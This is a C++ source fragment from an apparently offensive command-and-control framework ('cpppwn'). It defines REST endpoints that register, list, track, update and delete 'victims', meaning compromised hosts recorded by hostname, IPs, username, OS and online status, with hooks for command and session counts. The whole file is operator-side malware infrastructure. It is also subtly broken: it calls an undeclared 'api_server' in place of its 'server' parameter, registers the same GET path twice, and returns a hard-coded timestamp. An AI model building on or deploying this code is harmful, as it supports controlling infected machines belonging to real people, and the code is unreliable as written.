//-------------------------------------------------
//
//-------------------------------------------------
static inline void register_victims_endpoints(cpppwn::RESTServer& server) {
    auto& victims = VictimManager::instance();

    // ===== GET /api/victims - List all victims =====
    api_server.get("/api/victims", [&](const HttpRequest& req) {
        // Optional: filter by status query parameter
        // e.g., /api/victims?status=1
        std::string status_param = req.get_query("status");

        std::vector<VictimDAO> victim_list;

        if (!status_param.empty()) {
            int status = std::stoi(status_param);
            victim_list = victims.getVictimsByStatus(status);
        } else {
            victim_list = victims.getAllVictims();
        }

        std::string json = to_json_array(victim_list);
        return HttpResponse().set_json(json);
    });

    // ===== GET /api/victims/online - Get online victims =====
    api_server.get("/api/victims/online", [&](const HttpRequest& req) {
        (void)req;
        auto online = victims.getOnlineVictims();
        std::string json = to_json_array(online);
        return HttpResponse().set_json(json);
    });

    // ===== GET /api/victims/:id - Get single victim by ID =====
    api_server.get("/api/victims/", [&](const HttpRequest& req) {
        int64_t id = get_path_param_id(req.path, "/api/victims/");

        if (id == -1) {
            return HttpResponse()
                .set_status(400)
                .set_json(R"({"error":"Invalid victim ID"})");
        }

        auto* victim = victims.getVictim(id);

        if (!victim) {
            return HttpResponse()
                .set_status(404)
                .set_json(R"({"error":"Victim not found"})");
        }

        std::string json = victim->to_json();
        return HttpResponse().set_json(json);
    });

    // ===== POST /api/victims - Register new victim =====
    api_server.post("/api/victims", [&](const HttpRequest& req) {
        try {
            // Parse request body
            VictimDAO victim = VictimDAO::from_json(req.body);

            // Validate required fields
            if (victim.hostname.empty() || victim.external_ip.empty()) {
                return HttpResponse()
                    .set_status(400)
                    .set_json(R"({"error":"hostname and external_ip are required"})");
            }

            // Register victim
            bool success = victims.registerVictim(
                victim.internal_ip,
                victim.external_ip,
                victim.hostname,
                victim.username,
                victim.operating_system
            );

            if (!success) {
                return HttpResponse()
                    .set_status(500)
                    .set_json(R"({"error":"Failed to register victim"})");
            }

            return HttpResponse()
                .set_status(201)
                .set_json(R"({"message":"Victim registered successfully"})");

        } catch (const std::exception& e) {
            return HttpResponse()
                .set_status(400)
                .set_json(std::string(R"({"error":")") + e.what() + R"("})");
        }
    });

    // ===== PUT /api/victims/:id - Update victim =====
    api_server.put("/api/victims/", [&](const HttpRequest& req) {
        int64_t id = get_path_param_id(req.path, "/api/victims/");

        if (id == -1) {
            return HttpResponse()
                .set_status(400)
                .set_json(R"({"error":"Invalid victim ID"})");
        }

        try {
            // Parse request body
            VictimDAO updated_victim = VictimDAO::from_json(req.body);

            // Update in repository
            auto& repo = VictimRepository::instance();
            auto result = repo.update(id, updated_victim);

            if (!result) {
                return HttpResponse()
                    .set_status(404)
                    .set_json(R"({"error":"Victim not found or update failed"})");
            }

            std::string json = result->to_json();
            return HttpResponse().set_json(json);

        } catch (const std::exception& e) {
            return HttpResponse()
                .set_status(400)
                .set_json(std::string(R"({"error":")") + e.what() + R"("})");
        }
    });

    // ===== PATCH /api/victims/:id/status - Update victim status =====
    api_server.patch("/api/victims/", [&](const HttpRequest& req) {
        int64_t id = get_path_param_id(req.path, "/api/victims/");

        if (id == -1) {
            return HttpResponse()
                .set_status(400)
                .set_json(R"({"error":"Invalid victim ID"})");
        }

        try {
            // Parse status from body: {"status": 1}
            struct StatusUpdate {
                int status{0};
            };

            StatusUpdate update;
            glz::read_json(update, req.body);

            bool success = victims.updateVictimStatus(id, update.status);

            if (!success) {
                return HttpResponse()
                    .set_status(404)
                    .set_json(R"({"error":"Victim not found"})");
            }

            return HttpResponse()
                .set_json(R"({"message":"Status updated successfully"})");

        } catch (const std::exception& e) {
            return HttpResponse()
                .set_status(400)
                .set_json(std::string(R"({"error":")") + e.what() + R"("})");
        }
    });

    // ===== DELETE /api/victims/:id - Remove victim =====
    api_server.delete_("/api/victims/", [&](const HttpRequest& req) {
        int64_t id = get_path_param_id(req.path, "/api/victims/");

        if (id == -1) {
            return HttpResponse()
                .set_status(400)
                .set_json(R"({"error":"Invalid victim ID"})");
        }

        bool success = victims.removeVictim(id);

        if (!success) {
            return HttpResponse()
                .set_status(404)
                .set_json(R"({"error":"Victim not found"})");
        }

        return HttpResponse()
            .set_status(204)  // No Content
            .set_json(R"({})");
    });

    // ===== GET /api/victims/:id/stats - Get victim statistics =====
    api_server.get("/api/victims/", [&](const HttpRequest& req) {
        // Check if path ends with /stats
        if (req.path.find("/stats") != std::string::npos) {
            std::string id_path = req.path.substr(0, req.path.find("/stats"));
            int64_t id = get_path_param_id(id_path, "/api/victims/");

            if (id == -1) {
                return HttpResponse()
                    .set_status(400)
                    .set_json(R"({"error":"Invalid victim ID"})");
            }

            auto* victim = victims.getVictim(id);

            if (!victim) {
                return HttpResponse()
                    .set_status(404)
                    .set_json(R"({"error":"Victim not found"})");
            }

            // Build stats response
            struct VictimStats {
                int64_t victim_id;
                std::string hostname;
                int status;
                std::string last_seen;
                int command_count;
                int session_count;
            };

            // You can extend this with actual stats from other managers
            std::string stats_json = glz::write_json(VictimStats{
                victim->victim_id,
                victim->hostname,
                victim->status,
                "2025-01-15T10:30:00Z", // Format victim->last_update
                0,  // Get from CommandManager
                0   // Get from SessionManager
            }).value_or("{}");

            return HttpResponse().set_json(stats_json);
        }

        return HttpResponse()
            .set_status(404)
            .set_json(R"({"error":"Not found"})");
    });
}